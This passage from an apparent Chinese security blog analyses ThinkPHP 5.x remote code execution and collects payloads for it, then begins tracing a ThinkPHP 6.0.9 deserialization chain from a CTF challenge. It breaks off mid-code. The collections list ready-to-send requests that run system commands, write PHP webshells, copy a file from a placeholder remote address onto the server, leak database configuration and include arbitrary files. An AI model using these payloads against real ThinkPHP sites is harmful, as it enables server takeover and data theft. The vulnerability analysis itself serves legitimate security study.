<code>对该类的任意方法的调用</code>，其传入对应的参数即对应的$_POST数组。</p>\n<p>这里利用的地方是 <code>__construct()</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c82b887a0f054af5a8f171db4731be99.png\"></p>\n<p>所以当我们post传入<br><code>s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</code> 时</p>\n<p><code>_method触发__construct</code> ，<code>filter覆盖参数为system</code> ，<code>method覆盖为POST</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f35dee589d5647d4ac790630adb52749.png\"></p>\n<p>然后一路返回到run()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/eb2af877ab0549c7a50f8d0993c0826f.png\"></p>\n<p>因为此时开启debug，进入if 进入<code>$request-&gt;param()</code></p>\n<p>param()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/504a986fa93f42a7b7265d5a6c45428e.png\"></p>\n<p>进入<code>input()</code> 函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/09124093039d48149f7427898e9a51f5.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3c66457317324bfaa6ba438a0242d4a7.png\"></p>\n<p><code>array_walk_recursive() </code><br>对数组中的每个元素应用用户自定义函数，也就是说 <code>调用filterValue()</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1826311d22704305b57caf6ff1a697eb.png\"></p>\n<h2 id=\"未开启debug\"><a href=\"#未开启debug\" class=\"headerlink\" title=\"未开启debug\"></a>未开启debug</h2><p>5.0.x 跟 5.1.x 代码差异较大</p>\n<p>所以payload 也不尽相同</p>\n<p>以 <a href=\"https://www.easy233.top/2020/12/11/thinkphp5-rce-zong-jie/#toc-heading-5\">参考</a> 为例子</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/39523143e3614b18a43a708a9e0c4577.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16\"></p>\n<h1 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h1><p><code>$this-&gt;method</code> 可控导致可以调用<code>__contruct()覆盖Request类的filter字段</code>，然后<code>App::run()</code> 执行判断debug来决定是否执行 <code>$request-&gt;param()</code>，并且还有<code>$dispatch[&#39;type&#39;]</code> 等于<code>controller</code>或者 <code>method</code> 时会执行 <code>$request-&gt;param()</code>，而<code>$request-&gt;param()</code>会进入到 <code>input()</code> 方法，在这个方法中将被覆盖的filter回调call_user_func()，造成rce</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7df49593ac2640bdbf20d3914ef98103.png\"></p>\n<h1 id=\"收集\"><a href=\"#收集\" class=\"headerlink\" title=\"收集\"></a>收集</h1><p>基于__construct的payload大部分出现在 <code>5.0.x</code> 及低版本的 <code>5.1.x</code> 中。</p>\n<h2 id=\"5-0-amp-5-0-1-5-0-7\"><a href=\"#5-0-amp-5-0-1-5-0-7\" class=\"headerlink\" title=\"5.0&amp;5.0.1-5.0.7\"></a>5.0&amp;5.0.1-5.0.7</h2><p>与debug无关</p>\n<p>命令执行rce</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST </span><br><span class=\"line\">?s&#x3D;index&#x2F;index</span><br><span class=\"line\">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class=\"line\">aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class=\"line\">_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure>\n<p>写入木马getshell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-0-8-5-0-13\"><a href=\"#5-0-8-5-0-13\" class=\"headerlink\" title=\"5.0.8-5.0.13\"></a>5.0.8-5.0.13</h2><p>与debug无关</p>\n<p>命令执行rce</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">?s&#x3D;index&#x2F;index</span><br><span class=\"line\">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class=\"line\">aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system</span><br><span class=\"line\">_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami</span><br><span class=\"line\">c&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure>\n\n<p>写入木马getshell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-0-14-5-0-23\"><a href=\"#5-0-14-5-0-23\" class=\"headerlink\" title=\"5.0.14-5.0.23\"></a>5.0.14-5.0.23</h2><p>默认debug=flase，需要开启debug才能命令执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">?s&#x3D;index&#x2F;index</span><br><span class=\"line\">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class=\"line\">aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system</span><br><span class=\"line\">_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami</span><br><span class=\"line\">c&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure>\n<p>写入木马getshell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br><span class=\"line\">#5.0.21以后</span><br><span class=\"line\">_method&#x3D;__construct&amp;filter[]&#x3D;assert&amp;server[REQUEST_METHOD]&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)</span><br></pre></td></tr></table></figure>\n<p>有captcha路由时无需debug=true</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST </span><br><span class=\"line\">?s&#x3D;captcha&#x2F;calc</span><br><span class=\"line\">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;GET</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-0-24\"><a href=\"#5-0-24\" class=\"headerlink\" title=\"5.0.24\"></a>5.0.24</h2><p>最后一个版本RCE被修复</p>\n<h1 id=\"未开启强制路由命令执行\"><a href=\"#未开启强制路由命令执行\" class=\"headerlink\" title=\"未开启强制路由命令执行\"></a>未开启强制路由命令执行</h1><p><a href=\"https://xz.aliyun.com/t/3570#toc-1\">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>\n<p><a href=\"https://hyasin.github.io/2020/09/08/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\">ThinkPHP漏洞分析</a></p>\n<h2 id=\"收集-1\"><a href=\"#收集-1\" class=\"headerlink\" title=\"收集\"></a>收集</h2><p>命令执行</p>\n<p>5.0.x</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>\n<p>5.1.x</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?s&#x3D;index&#x2F;\\think\\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class=\"line\">?s&#x3D;index&#x2F;think\\request&#x2F;input?data[]&#x3D;phpinfo()&amp;filter&#x3D;assert</span><br><span class=\"line\">?s&#x3D;index&#x2F;\\think\\view\\driver\\Think&#x2F;__call&amp;method&#x3D;display&amp;params[]&#x3D;&lt;?php system(&#39;whoami&#39;); ?&gt;</span><br><span class=\"line\">?s&#x3D;index&#x2F;\\think\\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class=\"line\">?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>\n<p>写shell</p>\n<p>5.0.x</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?s&#x3D;&#x2F;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(%27远程地址%27,%27333.php%27)</span><br></pre></td></tr></table></figure>\n<p>5.1.x</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?s&#x3D;index&#x2F;\\think\\template\\driver\\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class=\"line\">?s&#x3D;index&#x2F;\\think\\view\\driver\\Think&#x2F;display&amp;template&#x3D;&lt;?php phpinfo();?&gt;             &#x2F;&#x2F;shell生成在runtime&#x2F;temp&#x2F;md5(template).php</span><br><span class=\"line\">?s&#x3D;&#x2F;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(&#39;远程地址&#39;,&#39;333.php&#39;)</span><br><span class=\"line\">?s&#x3D;index&#x2F;\\think\\view\\driver\\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>其他</p>\n<p>5.0.x</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?s&#x3D;index&#x2F;think\\config&#x2F;get&amp;name&#x3D;database.username &#x2F;&#x2F; 获取配置信息</span><br><span class=\"line\">?s&#x3D;index&#x2F;\\think\\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    &#x2F;&#x2F; 包含任意文件</span><br><span class=\"line\">?s&#x3D;index&#x2F;\\think\\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     &#x2F;&#x2F; 包含任意.php文件</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://y4er.com/post/thinkphp5-rce/\">Thinkphp5 RCE总结</a></p>\n<p><a href=\"https://www.easy233.top/2020/12/11/thinkphp5-rce-zong-jie/#toc-heading-6\">thinkphp5-rce-zong-jie</a></p>\n<p><a href=\"https://m0re.top/posts/86389a60/\">ThinkPHP5.x版本RCE漏洞分析与收集</a></p>\n<p><a href=\"https://hyasin.github.io/2020/09/08/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\">ThinkPHP 漏洞分析总结</a></p>\n<p><a href=\"https://hack-for.fun/a45.html\">ThinkPHP5漏洞学习-RCE</a></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP v6.0.9-12 eval反序列化代码执行 分析","url":"/2023/12/25/ThinkPHP%20v6.0.9%20eval%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>前几天打西湖杯的时候有个ThinkPHP v6.0.9 的题目，无法写文件，找到这篇文章利用eval执行php，所以跟一下，我跟的版本为6.0.9</p>\n<p>参考：<a href=\"https://xz.aliyun.com/t/9310\">ThinkPHP v6.0.7 eval反序列化利用链</a></p>\n<p>6.0.12存在利用</p>\n<h1 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h1><p>存在一个反序列点</p>\n<p>demo : app/controller/Index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">app</span>\\<span class=\"title\">controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">app</span>\\<span class=\"title\">BaseController</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseController</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">\t\tunserialize(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;unser&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>全局搜索__destruct函数</p>\n<p>在<code>抽象类 Model</code> 类 <code>(vendor/topthink/think-orm/src/Model.php)</code> 存在一个 <code>__destuct</code> 魔法方法。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2ce4e7a19a014c1e932d5244a2adec53.png\"></p>\n<p>进入save() 需要让 <code>lazySave = true</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">private $lazySave &#x3D; false;</span><br></pre></td></tr></table></figure>\n<p>跟进save()方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span> <span class=\"keyword\">implements</span> <span class=\"title\">JsonSerializable</span>, <span class=\"title\">ArrayAccess</span>, <span class=\"title\">Arrayable</span>, <span class=\"title\">Jsonable</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\">public function save(array $data = [], string $sequence = null): bool</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 数据对象赋值</span></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;setAttrs(<span class=\"variable\">$data</span>);  <span class=\"comment\">//没用</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;isEmpty() || <span class=\"literal\">false</span> === <span class=\"keyword\">$this</span>-&gt;trigger(<span class=\"string\">&#x27;BeforeWrite&#x27;</span>)) &#123;  <span class=\"comment\">//cys: 绕过两个函数  1.要求$this-&gt;data非空非零 </span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;                                <span class=\"comment\">//cys: 2.这里需要 $this-&gt;trigger(&#x27;BeforeWrite&#x27;) = true  跟进函数即为： $this-&gt;withEvent = false</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$result</span> = <span class=\"keyword\">$this</span>-&gt;exists ? <span class=\"keyword\">$this</span>-&gt;updateData() : <span class=\"keyword\">$this</span>-&gt;insertData(<span class=\"variable\">$sequence</span>);  <span class=\"comment\">//cys: private $exists = false;  尝试跟进 insertData()  参数 $sequence = null</span></span><br></pre></td></tr></table></figure>\n\n<p>这里需要绕过if语句，即 <code>$this-&gt;isEmpty()</code> 为 false <code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code> 为 true</p>\n<p>跟进<code>isEmpty()</code> 和 <code>trigger()</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isEmpty</span>(<span class=\"params\"></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">trigger</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$event</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">$this</span>-&gt;withEvent) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>那也就是<code>$this-&gt;data 要求不为 null</code> ，且 <code>$this-&gt;withEvent == false</code></p>\n<p>接着进行下一步：<br><code>$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</code></p>\n<p> 发现 <code>$this-&gt;exists默认false</code> 那么跟进 <code>$this-&gt;insertData($sequence)</code> ，默认 <code>$sequence = null</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insertData</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$sequence</span> = <span class=\"literal\">null</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">false</span> === <span class=\"keyword\">$this</span>-&gt;trigger(<span class=\"string\">&#x27;BeforeInsert&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;checkData();  <span class=\"comment\">//跟进checkDate() 发现为空操作</span></span><br><span class=\"line\">        <span class=\"variable\">$data</span> = <span class=\"keyword\">$this</span>-&gt;data;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 时间戳自动写入</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;autoWriteTimestamp) &#123;    <span class=\"comment\">// protected $autoWriteTimestamp; 未定义 跳出if</span></span><br><span class=\"line\">            <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">             * </span></span><br><span class=\"line\"><span class=\"comment\">             */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 检查允许字段</span></span><br><span class=\"line\">        <span class=\"variable\">$allowFields</span> = <span class=\"keyword\">$this</span>-&gt;checkAllowFields();  <span class=\"comment\">//来到这里 跟进 checkAllowFields()</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$db</span> = <span class=\"keyword\">$this</span>-&gt;db();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$db</span>-&gt;transaction(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) <span class=\"title\">use</span> (<span class=\"params\"><span class=\"variable\">$data</span>, <span class=\"variable\">$sequence</span>, <span class=\"variable\">$allowFields</span>, <span class=\"variable\">$db</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;strict(<span class=\"literal\">false</span>)</span><br><span class=\"line\">                -&gt;field(<span class=\"variable\">$allowFields</span>)</span><br><span class=\"line\">                -&gt;replace(<span class=\"keyword\">$this</span>-&gt;replace)</span><br><span class=\"line\">                -&gt;sequence(<span class=\"variable\">$sequence</span>)</span><br><span class=\"line\">                -&gt;insert(<span class=\"variable\">$data</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// 获取自动增长主键</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$pk</span> = <span class=\"keyword\">$this</span>-&gt;getPk();</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (is_string(<span class=\"variable\">$pk</span>) &amp;&amp; (!<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;data[<span class=\"variable\">$pk</span>]) || <span class=\"string\">&#x27;&#x27;</span> == <span class=\"keyword\">$this</span>-&gt;data[<span class=\"variable\">$pk</span>])) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">unset</span>(<span class=\"keyword\">$this</span>-&gt;get[<span class=\"variable\">$pk</span>]);</span><br><span class=\"line\">                    <span class=\"keyword\">$this</span>-&gt;data[<span class=\"variable\">$pk</span>] = <span class=\"variable\">$result</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// 关联写入</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;relationWrite)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;autoRelationInsert();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 标记数据已经存在</span></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;origin = <span class=\"keyword\">$this</span>-&gt;data;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 新增回调</span></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;trigger(<span class=\"string\">&#x27;AfterInsert&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>上面 $this-&gt;trigger(‘BeforeInsert’) 为true 所以下一步 </p>\n<p>跟进 <code>$this-&gt;checkData()</code> 为空操作跳过，进入if判断</p>\n<p><code>$this-&gt;autoWriteTimestamp</code> 未定义所以跳出if，此时进行 <code>$this-&gt;checkAllowFields()</code></p>\n<p>跟进</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkAllowFields</span>(<span class=\"params\"></span>): <span class=\"title\">array</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 检测字段</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;field)) &#123;                                       <span class=\"comment\">//protected $field = [];  protected $schema = [];  默认空数组</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;schema)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;field = array_keys(array_merge(<span class=\"keyword\">$this</span>-&gt;schema, <span class=\"keyword\">$this</span>-&gt;jsonType));</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;                                                      <span class=\"comment\">//进入 else分支</span></span><br><span class=\"line\">                <span class=\"variable\">$query</span> = <span class=\"keyword\">$this</span>-&gt;db();</span><br><span class=\"line\">                <span class=\"variable\">$table</span> = <span class=\"keyword\">$this</span>-&gt;table ? <span class=\"keyword\">$this</span>-&gt;table . <span class=\"keyword\">$this</span>-&gt;suffix : <span class=\"variable\">$query</span>-&gt;getTable();</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;field = <span class=\"variable\">$query</span>-&gt;getConnection()-&gt;getTableFields(<span class=\"variable\">$table</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;field;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * </span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中 <code>$this-&gt;field</code> 和 <code>$this-&gt;schema</code> 的默认值都为 <code>[]</code> ，因而可以直接来到 <code>else&#123;</code>。</p>\n<p>那么，继续跟进 <code>$this-&gt;db</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">db</span>(<span class=\"params\"><span class=\"variable\">$scope</span> = []</span>): <span class=\"title\">Query</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">/** <span class=\"doctag\">@var</span> Query $query */</span></span><br><span class=\"line\">        <span class=\"variable\">$query</span> = <span class=\"built_in\">self</span>::<span class=\"variable\">$db</span>-&gt;connect(<span class=\"keyword\">$this</span>-&gt;connection)</span><br><span class=\"line\">            -&gt;name(<span class=\"keyword\">$this</span>-&gt;name . <span class=\"keyword\">$this</span>-&gt;suffix)</span><br><span class=\"line\">            -&gt;pk(<span class=\"keyword\">$this</span>-&gt;pk);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;table)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$query</span>-&gt;table(<span class=\"keyword\">$this</span>-&gt;table . <span class=\"keyword\">$this</span>-&gt;suffix); <span class=\"comment\">//$this-&gt;table 存在字符串拼接 使其为类可调用__toString()</span></span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * </span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>第一句 <code>$query = ... </code> 可以直接跳过</p>\n<p>而在 <code>$query-&gt;table($this-&gt;table . $this-&gt;suffix)</code> 有字符拼接。这样只需要让 <code>$this-&gt;table (未定义)</code>或 <code>$this-&gt;suffix</code> 为一个 <code>类</code> 就可以触发那个 类 的 <code>__toString</code> 魔法方法。</p>\n<p>那么目前需要修改的参数为</p>\n<ul>\n<li> <strong>$this-&gt;lazySave = true</strong></li>\n<li>   <strong>$this-&gt;data = [7]</strong></li>\n<li>   <strong>$this-&gt;withEvent = false</strong></li>\n<li>   <strong>$this-&gt;table = 存在toString的一个类</strong></li>\n</ul>\n<h1 id=\"魔术方法跳板\"><a href=\"#魔术方法跳板\" class=\"headerlink\" title=\"魔术方法跳板\"></a>魔术方法跳板</h1><p>接下来找含有 <code>__toString</code> 方法的类 </p>\n<p>这里选择:<br><code>\\tp6.0.9\\vendor\\topthink\\framework\\src\\think\\route\\Url.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Url</span></span></span><br><span class=\"line\">public function __toString()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;build();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>跟进build()方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">build</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 解析URL</span></span><br><span class=\"line\">        <span class=\"variable\">$url</span>     = <span class=\"keyword\">$this</span>-&gt;url;</span><br><span class=\"line\">        <span class=\"variable\">$suffix</span>  = 